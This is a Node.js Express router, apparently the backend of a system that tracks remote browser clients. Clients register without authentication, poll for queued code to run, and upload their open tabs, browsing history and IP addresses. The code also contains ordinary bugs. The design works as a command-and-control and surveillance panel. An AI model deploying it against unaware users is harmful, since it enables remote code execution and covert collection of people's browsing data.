var router = require('express').Router(),
    auth = require('../auth'),
    Client = require('mongoose').model('Client')

function log(msg) {
    console.log(`[*] Clients: ${msg}`)
}

var commands = {}
var id = 0

function validId(req, res, next) {
    Client.findById(req.params.id, (err, client) => {
        if (err) {
            Client.find({ }, (err, clients) => {
                return res.render('clients/index.html', { clients: clients, err: "Could not find specified client" })
            })
        } else {
            req.client = client
            next()
        }
    })
}

router.get('/clients', auth.user, (req, res, next) => {
    Client.find({ }, (err, clients) => {
        res.render('clients/index.html', { clients: clients })
    })
})

router.get('/clients/stats', auth.user, (req, res, next) => {
    Client.find({ }, (err, clients) => {
        if (err) return next(err) 

        var tabCount = 0, historyCount = 0, blockCount = 0

        for (var i = 0; i < clients.length; ++i) {
            tabCount += clients[i].tabs.length
            historyCount += clients[i].history.length
            blockCount += clients[i].blocks.length
        }

        res.json({
            clientCount: clients.length,
            tabCount: tabCount,
            historyCount: historyCount,
            blockCount: blockCount
        });
    })
})

router.get('/clients/connect', (req, res, next) => {
    client = new Client()
    client.save((err, client) => {
        if (err) return next(err) 
        log(`New client connected`)
        commands[client.id] = []
        res.send(client.id)
    })
})

router.get('/clients/:id', auth.user, validId, (req, res) => {
    res.render('clients/client.html', { _client: req.client, commands: commands[req.client.id] })
})

router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
    Client.findByIdAndUpdate(req.client.id, {
        name: req.body.name,
        note: req.body.note
    }, err => {
        if (err) return next(err) 
        if (req.body.name) {
            log(`${req.client.id}: Name and note modified`)
            res.render('clients/client.html', {
                _client: req.client,
                commands: commands[req.client.id],
                msg: req.body.note ? "Success! Name changed and note added." : "Success! Name changed and note cleared."
            })
        } else {
            log(`${req.client.id}: Note modified`)
            res.render('clients/client.html', {
                _client: req.client,
                commands: commands[req.client.id],
                msg: req.body.note ? "Success! Note added." : "Success! Note cleared."
            })
        }
    })
})

router.get('/clients/:id/connect', validId, (req, res) => {
    log(`${req.client.id}: Client reconnected`)
    commands[req.client.id] = []
    res.sendStatus(200)
})

router.get('/clients/:id/disconnect', (req, res) => {
    Client.findByIdAndRemove(req.params.id, (err, client) => {
        if (err) return next(err) 
        log(`${client.id}: Client disconnected`)
        res.sendStatus(200)
    })
})

router.get('/clients/:id/bulletin', validId, (req, res) => {
    res.json(commands[req.client.id])
})

router.post('/clients/:id/bulletin', auth.user, validId, (req, res) => {
    var data = JSON.parse(req.body.data)
    if (data.code) {
        log(`${req.client.id}: Command posted`)
        commands[req.client.id].push({
            id: id++,
            code: data.code,
            args: data.args
        })
        res.sendStatus(200)
    } else {
        res.sendStatus(400)
    }
})

router.post('/clients/:id/bulletin/respond', validId, (req, res) => {
    var result = JSON.parse(req.body.result)
    for (var i = 0; i < commands[req.client.id].length; ++i) {
        if (commands[req.client.id][i].id === result.id) {
            commands.splice(i, 1)
            break
        }
    }
    log(`${req.client.id}: Command consumed, ${result.success}`)
    res.sendStatus(200);
})

router.post('/clients/:id/update', validId, (req, res) => {
    var body = JSON.parse(req.body.data)
    Client.findByIdAndUpdate(req.client.id, {
         blocks: body.blocks,
         tabs: body.tabs,
         history: body.history,
         ips: body.ips
    }, err => {
        if (err) return next(err) 
        log(`${req.client.id}: Information updated`)
        res.send("Updated")
    })
})

module.exports = router